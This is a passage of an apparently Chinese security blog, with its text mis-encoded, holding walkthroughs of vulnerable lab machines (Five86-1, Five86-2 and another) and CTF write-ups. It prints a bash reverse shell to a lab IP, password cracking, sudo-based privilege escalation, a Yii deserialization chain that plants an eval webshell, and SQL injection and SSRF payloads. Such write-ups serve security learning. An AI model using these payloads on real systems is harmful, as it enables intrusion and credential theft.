Lumbergh,,,:&#x2F;home&#x2F;blumbergh:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><p>æœ‰ä¸¤ä¸ªç”¨æˆ·å¾ˆæœ‰æ„æ€ï¼šmilton &amp; blumberghï¼ˆå®ƒä¿©éƒ½æœ‰ /bin/bashï¼‰ã€‚å¯ä»¥åœ¨ /var/www/5446 ä¸­å‘ç°ä¸¤ä¸ªæœ‰è¶£çš„ php æ–‡ä»¶ï¼š</p><p><img src="https://i.loli.net/2021/05/13/QHYwarZ3W9FDOJm.png"></p><p>æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹ï¼Œé‡Œé¢æœ‰æ•°æ®åº“ç”¨æˆ· root çš„ä¿¡æ¯ï¼š</p><p><img src="https://i.loli.net/2021/05/13/rCIt6ZE58MqimnY.png"></p><p>å¯†ç ä¸ºç©ºï¼Œæˆ‘ä»¬ç›´æ¥ç”¨ mysql -uroot -p å°±å¯ä»¥ç™»å…¥ï¼š</p><p><img src="https://i.loli.net/2021/05/13/bZHUfsgpeAzFi47.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br><span class="line">use mysql;</span><br><span class="line">select user,password from user;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ç”¨æˆ·å¯†ç è¡¨ï¼š</p><table><thead><tr><th>user</th><th>password</th></tr></thead><tbody><tr><td>root</td><td></td></tr><tr><td>milton</td><td>6450d89bd3aff1d893b85d3ad65d2ec2</td></tr><tr><td>root</td><td></td></tr><tr><td>root</td><td></td></tr><tr><td>debian-sys-maint</td><td>*A9523939F1B2F3E72A4306C34F225ACF09590878</td></tr></tbody></table><p>å¾—åˆ° milton çš„å¯†ç  hash ä¸º 6450d89bd3aff1d893b85d3ad65d2ec2ï¼Œç»è§£å¯†å¾—åˆ°ï¼š<code>thelaststraw</code>ï¼Œå½³äºâ€¦ <code>su milton</code>ï¼Œå†è¾“å…¥å¯†ç ï¼Œè¿™æ ·å°±ææƒåˆ° milton äº†ã€‚åœ¨å†å²å‘½ä»¤ä¸­å‘ç°æœ‰ su åˆ° blumbergh ç”¨æˆ·ï¼Œå¯»æ‰¾ blumbergh ç”¨æˆ·å¯†ç ã€‚</p><p>åœ¨ <a href="http://192.168.110.140/images/bill.png">http://192.168.110.140/images/bill.png</a> çš„ exif ä¸­å­˜åœ¨æŸç¥ç§˜å­—ç¬¦ä¸² <code>coffeestains</code>ï¼Œå°è¯•ä½œä¸º blumbergh ç”¨æˆ·å¯†ç ç™»å½•ã€‚æˆåŠŸç™»å½•ï¼ŒæŸ¥çœ‹ä¸€ä¸‹æƒé™ï¼š</p><p><img src="https://i.loli.net/2021/05/13/iEvmcHzBZ6uaL1I.png"></p><p><img src="https://i.loli.net/2021/05/13/4Bw1tUfXdkmvNQ6.png"></p><p>å¯ä»¥å‘ç° <code>/usr/share/cleanup/tidyup.sh</code> æ²¡æœ‰å†™å…¥æƒé™ï¼Œä½†æ˜¯å¯ä»¥ç”¨ root æƒé™æ‰§è¡Œ tee å‘½ä»¤æŠŠåå¼¹ shell å‘½ä»¤å†™å…¥ç„¶åæ‰§è¡Œã€‚ï¼ˆteeå‘½ä»¤ç”¨äºè¯»å–æ ‡å‡†è¾“å…¥çš„æ•°æ®ï¼Œå¹¶å°†å…¶å†…å®¹è¾“å‡ºæˆæ–‡ä»¶ï¼‰</p><p>çœ‹ä¸€ä¸‹ tidyup.sh é‡Œé¢æ˜¯å•¥å§ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/lib/tomcat6/webapps &amp;&amp; find swingline -mindepth 1 -maxdepth 10 | xargs rm -rf</span><br></pre></td></tr></table></figure><p>æ¯éš”ä¸‰åˆ†é’Ÿå°±ä¼šæ¸…ç† webapps ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼Œæ‰€ä»¥ä¹‹å‰ä¼ çš„ğŸå¦‚æœä¸åå¼¹ shell çš„è¯å¾ˆå¿«å°±ä¼šè¢«åˆ æ‰ã€‚</p><p>æ¥ä¸‹æ¥å°±æ˜¯å†™å…¥å‘½ä»¤å¼¹ shell äº†ï¼šï¼ˆåŒæ—¶å¦å¤–å¼€ä¸€ä¸ª terminal æ¥æ¥å— shellï¼‰</p><p><img src="https://i.loli.net/2021/05/13/7PcaTGvr3MXZBwm.png"></p><p><img src="https://i.loli.net/2021/05/13/FvfjmRVUbPzk5WX.png"></p><p>å¯ä»¥å‘ç°æˆ‘ä»¬å·²ç»ææƒè‡³äº† rootï¼Œåé¢ flag ä»€ä¹ˆçš„ä¾¿ä¸é‡è¦äº†ã€‚</p><h2 id="Five86-1"><a href="#Five86-1" class="headerlink" title="Five86-1"></a>Five86-1</h2><p>Nmap æ‰«ä¸€ä¸‹ã€‚</p><p><img src="https://i.loli.net/2021/05/13/WTVzvbgFcrksuU2.png" alt="U_MH_Q9JAM05PC__GW77DJ5.png"></p><p>10000 ç«¯å£å¼€äº†ä¸ª <code>Webmin httpd 1.920</code>ï¼Œå¯ä»¥æœä¸€ä¸‹æœ‰æ—  expã€‚ï¼ˆWebmin æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„ UNIX web ç®¡ç†ï¼‰</p><p><img src="https://i.loli.net/2021/05/14/x4BjoNLF6eKCp1v.png"></p><p>robots.txt é‡Œå‘ç° /ona è·¯ç”±ï¼Œè®¿é—®ä¸€ä¸‹ï¼Œå‘ç°æ˜¯ OpenNetAdminï¼Œæœä¸€ä¸‹æœ‰æ—  expï¼š</p><p><img src="https://i.loli.net/2021/05/14/XfprCJUjvYn7TIK.png"></p><p><img src="https://i.loli.net/2021/05/14/HuPBYdxZX9LylKs.png"></p><p>æŠŠ exp å¤åˆ¶å‡ºæ¥ä¸¢åˆ° msf é‡Œé¢ï¼Œç›´æ¥æ‰“ä¸€å‘ï¼š</p><p><code>cp /usr/share/exploitdb/exploits/php/webapps/47772.rb /usr/share/metasploit-framework/modules/exploits</code></p><p><img src="https://i.loli.net/2021/05/14/IFRLAYWqaoGtS8v.png" alt="2VVE3EMW08WLWS__PGPW_Z9.png"></p><p><img src="https://i.loli.net/2021/05/14/vHzlJdCqMFou97O.jpg"></p><p>åœ¨å®¶ç›®å½•é‡Œé¢å‘ç°æç¤ºï¼š</p><p><img src="https://i.loli.net/2021/05/14/Qy6oFRhgStKIm3x.png"></p><p>douglas ç”¨æˆ·çš„å¯†ç ç”± aefhrt æ„æˆåä½ï¼Œå¯ä»¥çˆ†ç ´ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">crunch 10 10 aefhrt &gt; passwd</span><br><span class="line">echo &#39;douglas:$apr1$9fgG&#x2F;hiM$BtsL9qpNHUlylaLxk81qY1&#39; &gt; 1.txt</span><br><span class="line">john --wordlist&#x3D;passwd 1.txt</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/05/14/UxMPp2Eg9VF6rBL.jpg"></p><p>è¦çˆ†å¾ˆä¹…ï¼Œçˆ†å‡ºæ¥å¯†ç ä¸ºï¼šfatherrrrrï¼Œç™»å½•ä¸€æ³¢ï¼š</p><p><img src="https://i.loli.net/2021/05/14/drFCt83HUP5DegE.jpg"></p><p>sudo -l å‘ç°å¯ä»¥ä»¥ jen çš„èº«ä»½æ‰§è¡Œ cp å‘½ä»¤ï¼š</p><p><img src="https://i.loli.net/2021/05/14/6FVjiADQZuWY8Id.jpg"></p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å†™å…¥ jen çš„ authorized_keys æ¥åŒ…å« douglas çš„å…¬é’¥ï¼Œä»è€Œç›´æ¥ç”¨ douglas çš„ id_rsa å…å¯† ssh ç™»å½• jenï¼Œå› ä¸º jen æ²¡æœ‰æƒé™è®¿é—® douglasï¼Œè€Œ douglas ä¹Ÿäº¦ç„¶ï¼Œæ‰€ä»¥å…ˆä¸¢åˆ° /tmpï¼Œå†è½¬ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cp ~/.ssh/id_rsa.pub /tmp/authorized_keys</span><br><span class="line">chmod 777 /tmp/authorized_keys</span><br><span class="line">sudo -u jen /bin/cp /tmp/authorized_keys /home/jen/.ssh/</span><br><span class="line">ssh -i id_rsa jen@127.0.0.1</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/05/14/dbGzqjw1trkXy3s.jpg"></p><p>è¿˜å¯ä»¥å‘ç°ä¸€ä¸ª mailï¼Œçœ‹ä¸€ä¸‹ï¼š</p><p><img src="https://i.loli.net/2021/05/14/9wqnAT3EsrU5e4t.jpg"></p><p>è·å–åˆ°äº† moss ç”¨æˆ·çš„å¯†ç ï¼Œç™»ä¸Šï¼š</p><p><img src="https://i.loli.net/2021/05/14/rda38HnP6S5pfij.jpg"></p><p>å®¶ç›®å½•é‡Œé¢å‘ç° .games/ é‡Œé¢æœ‰æå‡æƒé™çš„æ–‡ä»¶ï¼Œç›´æ¥æ‰§è¡Œï¼š</p><p><img src="https://i.loli.net/2021/05/14/LwxjPEQHvTBUK68.png"></p><p>è·å¾— root æƒé™ï¼š</p><p><img src="https://i.loli.net/2021/05/14/e4d3WR8wcLba9XV.jpg"></p><p>root é‡Œé¢è½»å– flagï¼š</p><p><img src="https://i.loli.net/2021/05/14/2xlvmORPjBCTIt8.jpg"></p><h2 id="Five86-2"><a href="#Five86-2" class="headerlink" title="Five86-2"></a>Five86-2</h2><p>Nmap æ‰«ï¼š</p><p><img src="https://i.loli.net/2021/05/14/nrgfwdBFH7Wqkx5.png"></p><p>æ— æ³•åŠ è½½çš„è¯å¯ä»¥å°è¯•åœ¨ C:\Windows\System32\drivers\etc\hosts æ·»åŠ ä¸€æ¡ <code>192.168.237.138 five86-2</code>ï¼ˆé¶æœº IP è‡ªæ”¹ï¼‰ã€‚</p><p>æ˜¯ WordPress æ¡†æ¶ï¼Œç”¨ wpscan çˆ†ç ´ç”¨æˆ·åï¼š<code>wpscan --url &quot;http://192.168.237.138&quot; -e u</code></p><p><img src="https://i.loli.net/2021/05/14/tywcNYSPUJsLlnV.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">peter</span><br><span class="line">admin</span><br><span class="line">barney</span><br><span class="line">stephen</span><br><span class="line">gillian</span><br></pre></td></tr></table></figure><p>ç„¶åä½¿ç”¨ kali è‡ªå¸¦çš„ rockyou.txt çˆ†ä¸€ä¸‹å¯†ç ï¼šï¼ˆrockyou.txt æ˜¯ç”± rockyou.txt.gz è§£å‹è€Œæ¥ï¼‰ï¼ˆçˆ†ä½ ğŸä¸€å¹´ï¼‰</p><p><code>wpscan --url &quot;http://192.168.237.138&quot; -U user.txt -P /usr/share/wordlists/rockyou.txt</code></p><p><img src="https://i.loli.net/2021/05/14/vViWaf52dl8Jgns.png"></p><p>çˆ†å‡ºæ¥ä¸¤å¯¹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username: barney, Password: spooky1</span><br><span class="line">Username: stephen, Password: apollo1</span><br></pre></td></tr></table></figure><p>å¯ä»¥åˆ©ç”¨ <a href="https://www.freebuf.com/vuls/205735.html%EF%BC%8C%E6%8F%92%E4%BB%B6%E4%BC%A0%E9%A9%AC%E3%80%82">https://www.freebuf.com/vuls/205735.htmlï¼Œæ’ä»¶ä¼ é©¬ã€‚</a></p><p><img src="https://i.loli.net/2021/05/19/dqM8aRlOjfxvWVI.png"></p><p><img src="https://i.loli.net/2021/05/19/Xorw1b42TLCGy87.png"></p><p><img src="https://i.loli.net/2021/05/19/HE7dR5Nf4iKTSIl.png"></p><p>åŒ…å« 111.php ä¸ index.htmlï¼Œ111.phpåå¼¹ä¸€ä¸ª shellï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> exec(<span class="string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.237.253/2333 0&gt;&amp;1&#x27;&quot;</span>);phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/05/19/PpTcRSDNJ6mUbzG.png"></p><p>åˆ©ç”¨ä¹‹å‰çˆ†å‡ºæ¥çš„è´¦æˆ·å¯†ç ï¼ˆstephen:apollo1ï¼‰ææƒã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su stephen</span><br><span class="line">python3 -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/05/19/JnWDdif5eupOMAV.png"></p><p><code>ps -auxwww</code> çœ‹ä¸€ä¸‹è·‘çš„è¿›ç¨‹ã€‚</p><p><img src="https://i.loli.net/2021/05/19/PZdhlvFrRwMOfEa.png"></p><p>å‘ç° paul ç”¨æˆ·è·‘äº†ä¸ª ftp ä¸Šä¼ çš„è„šæœ¬ã€‚tcpdump å‘ç°æœ‰å¤šå¼ ç½‘å¡ï¼Œå°è¯•ç›‘å¬æ¥è·å–ç”¨æˆ·åå¯†ç ã€‚    </p><p><img src="https://i.loli.net/2021/05/19/V8an2dloi7FyEAG.png"></p><hr><h3 id="tcpdump-å¸¸ç”¨å‚æ•°åŠä½¿ç”¨æ–¹æ³•"><a href="#tcpdump-å¸¸ç”¨å‚æ•°åŠä½¿ç”¨æ–¹æ³•" class="headerlink" title="tcpdump å¸¸ç”¨å‚æ•°åŠä½¿ç”¨æ–¹æ³•"></a>tcpdump å¸¸ç”¨å‚æ•°åŠä½¿ç”¨æ–¹æ³•</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">-cï¼šæŒ‡å®šè¦æŠ“å–çš„åŒ…æ•°é‡ã€‚</span><br><span class="line"></span><br><span class="line">-i interfaceï¼šæŒ‡å®štcpdumpéœ€è¦ç›‘å¬çš„æ¥å£ã€‚é»˜è®¤ä¼šæŠ“å–ç¬¬ä¸€ä¸ªç½‘ç»œæ¥å£</span><br><span class="line"></span><br><span class="line">-nï¼šå¯¹åœ°å€ä»¥æ•°å­—æ–¹å¼æ˜¾å¼ï¼Œå¦åˆ™æ˜¾å¼ä¸ºä¸»æœºåï¼Œä¹Ÿå°±æ˜¯è¯´-né€‰é¡¹ä¸åšä¸»æœºåè§£æã€‚</span><br><span class="line"></span><br><span class="line">-nnï¼šé™¤äº†-nçš„ä½œç”¨å¤–ï¼Œè¿˜æŠŠç«¯å£æ˜¾ç¤ºä¸ºæ•°å€¼ï¼Œå¦åˆ™æ˜¾ç¤ºç«¯å£æœåŠ¡åã€‚</span><br><span class="line"></span><br><span class="line">-Pï¼šæŒ‡å®šè¦æŠ“å–çš„åŒ…æ˜¯æµå…¥è¿˜æ˜¯æµå‡ºçš„åŒ…ã€‚å¯ä»¥ç»™å®šçš„å€¼ä¸º&quot;in&quot;ã€&quot;out&quot;å’Œ&quot;inout&quot;ï¼Œé»˜è®¤ä¸º&quot;inout&quot;ã€‚</span><br><span class="line"></span><br><span class="line">-Dï¼šåˆ—å‡ºå¯ç”¨äºæŠ“åŒ…çš„æ¥å£ã€‚å°†ä¼šåˆ—å‡ºæ¥å£çš„æ•°å€¼ç¼–å·å’Œæ¥å£åï¼Œå®ƒä»¬éƒ½å¯ä»¥ç”¨äº&quot;-i&quot;åã€‚</span><br><span class="line"></span><br><span class="line">-Fï¼šä»æ–‡ä»¶ä¸­è¯»å–æŠ“åŒ…çš„è¡¨è¾¾å¼ã€‚è‹¥ä½¿ç”¨è¯¥é€‰é¡¹ï¼Œåˆ™å‘½ä»¤è¡Œä¸­ç»™å®šçš„å…¶ä»–è¡¨è¾¾å¼éƒ½å°†å¤±æ•ˆã€‚</span><br><span class="line"></span><br><span class="line">-wï¼šå°†æŠ“åŒ…æ•°æ®è¾“å‡ºåˆ°æ–‡ä»¶ä¸­è€Œä¸æ˜¯æ ‡å‡†è¾“å‡ºã€‚å¯ä»¥åŒæ—¶é…åˆ&quot;-G&quot; &quot;time&quot; é€‰é¡¹ä½¿å¾—è¾“å‡ºæ–‡ä»¶æ¯timeç§’å°±è‡ªåŠ¨åˆ‡æ¢åˆ°å¦ä¸€ä¸ªæ–‡ä»¶ã€‚å¯é€šè¿‡&quot;-r&quot;é€‰é¡¹è½½å…¥è¿™äº›æ–‡ä»¶ä»¥è¿›è¡Œåˆ†æå’Œæ‰“å°ã€‚</span><br><span class="line"></span><br><span class="line">-rï¼šä»ç»™å®šçš„æ•°æ®åŒ…æ–‡ä»¶ä¸­è¯»å–æ•°æ®ã€‚ä½¿ç”¨&quot;-&quot;è¡¨ç¤ºä»æ ‡å‡†è¾“å…¥ä¸­è¯»å–ã€‚</span><br></pre></td></tr></table></figure><hr><p><img src="https://i.loli.net/2021/05/19/2mNkJy1uCKMbYgH.png"></p><p>æˆ‘ä»–é©¬ï¼ŒçœŸçš„çƒ¦siã€‚æŠ„ä¸€æ³¢å¸ˆå‚…ä»¬çš„ç­”æ¡ˆç®—äº†ï¼š<code>paul:esomepasswford</code>ï¼š</p><p><img src="https://i.loli.net/2021/05/19/2pURNmyEvLFZMwg.png"></p><p><code>sudo -l</code> å‘ç°å¯ä»¥ä»¥ peter èº«ä»½æ‰§è¡Œ serviceï¼Œæˆ‘ä»¬ç›´æ¥ <code>sudo -u peter service ../../bin/bash</code> ææƒï¼š</p><p><img src="https://i.loli.net/2021/05/19/UOBlHNtoF8kKfhC.png"></p><p><code>sudo -l</code> ï¼Œç›´æ¥ passwd æ”¹ root å¯†ç ï¼š</p><p><img src="https://i.loli.net/2021/05/19/Rxh48O3PadGkH6g.png"></p><p><img src="https://i.loli.net/2021/05/19/WvAkua5Oldw2RIq.png"></p><p>å®Œäº‹ã€‚</p><p><img src="https://i.loli.net/2021/05/19/kQKUtMLF6RisHmV.png"></p><h2 id="å…¶å®ƒ"><a href="#å…¶å®ƒ" class="headerlink" title="å…¶å®ƒ"></a>å…¶å®ƒ</h2><h3 id="Nmap-ç›¸å…³"><a href="#Nmap-ç›¸å…³" class="headerlink" title="Nmap ç›¸å…³"></a>Nmap ç›¸å…³</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-sT -sS: éšç§˜çš„TCPè¿æ¥æ‰«é¢ï¼Œå¾ˆå¯é </span><br><span class="line">-A: è¯¦ç»†æ‰«æ</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> æ™ºæ…§çš„æ”¶è— </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021_Red_Hat and WICCTF_WP</title>
      <link href="2021/05/09/2021-Red-Hat-and-WICCTF-WP/"/>
      <url>2021/05/09/2021-Red-Hat-and-WICCTF-WP/</url>
      
        <content type="html"><![CDATA[<p>è¿˜åœ¨å®‰å¾½ï¼Œç›´æ¥åœ¨é…’åº—é‡Œçœ‹äº†çœ‹é¢˜ã€‚</p><h2 id="çº¢å¸½æ¯"><a href="#çº¢å¸½æ¯" class="headerlink" title="çº¢å¸½æ¯"></a>çº¢å¸½æ¯</h2><h3 id="find-it"><a href="#find-it" class="headerlink" title="find_it"></a>find_it</h3><p>robots.txtï¼Œswp æºç æ³„éœ²</p><p>flag åœ¨ phpinfo</p><h3 id="framework"><a href="#framework" class="headerlink" title="framework"></a>framework</h3><p>Yii çš„ååºåˆ—åŒ–é“¾</p><p>POCï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$modelClass</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&quot;file_put_contents(&#x27;1.php&#x27;, &#x27;&lt;?php eval(\$_POST[Du1]);&#x27;);&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mzp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NjoiYXNzZXJ0IjtzOjI6ImlkIjtzOjU1OiJmaWxlX3B1dF9jb250ZW50cygnMS5waHAnLCAnPD9waHAgZXZhbCgkX1BPU1RbRHUxXSk7Jyk7IjtzOjEwOiJtb2RlbENsYXNzIjtOO31pOjE7czozOiJydW4iO319fX0=</span></span><br></pre></td></tr></table></figure><p>about é‡Œä¼ å…¥ï¼Œå†™ä¸ªğŸï¼ŒApache_mod_cgi ç»• disable_funcï¼Œreadflag è¯»å– flagã€‚</p><h3 id="WebsiteManger"><a href="#WebsiteManger" class="headerlink" title="WebsiteManger"></a>WebsiteManger</h3><p>ç›²æ³¨å¾—åˆ°ç®¡ç†å‘˜å¯†ç ï¼Œpayloadï¼š<code>^((ascii(substr((select(group_concat(password))from(users)),&#123;&#125;,1)))=&#123;&#125;)</code></p><p>SSRF ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;flag</span><br><span class="line">127.0.0.1</span><br></pre></td></tr></table></figure><h3 id="ezlight"><a href="#ezlight" class="headerlink" title="ezlight"></a>ezlight</h3><p>å å‘ï¼Œåƒåœ¾æŸæ˜¥ç§‹åäºŒç‚¹å°±æ€¥ç€å…³é¶æœºï¼Œæ²¡æ¥å¾—åŠå¤ç°ï¼Œå…ˆå ä¸ªå‘ï¼ŒY1ng å¸ˆå‚…å¤ªQQQQQäº†</p><p><a href="https://www.gem-love.com/websecurity/2763.html#0x01_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">https://www.gem-love.com/websecurity/2763.html#0x01_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0</a></p><h2 id="æ´¥é—¨æ¯"><a href="#æ´¥é—¨æ¯" class="headerlink" title="æ´¥é—¨æ¯"></a>æ´¥é—¨æ¯</h2><h3 id="power-cut"><a href="#power-cut" class="headerlink" title="power_cut"></a>power_cut</h3><p>swp æºç æ³„éœ²ã€‚</p><p>ååºåˆ—åŒ–ï¼Œç›´æ¥åˆ©ç”¨ logger çš„ readfile è¯»å– flagï¼Œflag è¢«è¿‡æ»¤ï¼Œå¯ä»¥ç”¨åŒå†™ç»•è¿‡ã€‚</p><p><code>poc</code>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">logger</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$logFile</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$initMsg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$exitMsg</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">weblog</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$weblogfile</span>=<span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> weblog()));</span><br></pre></td></tr></table></figure><p><code>payload</code>ï¼š</p><p><code>O%3A6%3A%22weblog%22%3A1%3A%7Bs%3A10%3A%22weblogfile%22%3Bs%3A5%3A%22%2Fflflagag%22%3B%7D</code></p><h3 id="hatephp"><a href="#hatephp" class="headerlink" title="hatephp"></a>hatephp</h3><p>php5ï¼Œpå¸ˆå‚…æ–‡ç« é‡Œæåˆ°è¿‡è¿™ä¸ªæ–¹æ³•ï¼Œ@ è¢«è¿‡æ»¤ï¼Œç”¨ ? å³å¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;?code&#x3D;?&gt;&lt;?&#x3D;&#96;.%20&#x2F;???&#x2F;????????[?-[]&#96;;?&gt; HTTP&#x2F;1.1</span><br><span class="line">Host: 